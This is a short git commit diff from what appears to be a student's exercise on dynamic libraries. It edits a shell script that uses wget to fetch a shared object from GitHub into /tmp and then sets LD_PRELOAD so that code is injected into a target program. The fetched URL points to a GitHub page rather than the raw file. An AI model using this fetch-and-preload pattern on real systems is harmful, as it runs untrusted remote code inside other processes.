6f289b2fb00dd23c7804b0cd66590f317da13f97
S1M0BH <mohamedbchiri90@gmail.com>
2023-06-19 14:01:03 -0700

    0x18

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/S1M0BH/alx-low_level_programming/blob/main/0x18-dynamic_libraries/test.so
-export LD_PRELOAD=/tmp/test.so
+wget -P /tmp https://github.com/S1M0BH/alx-low_level_programming/blob/main/0x18-dynamic_libraries/te.so
+export LD_PRELOAD=/tmp/te.so
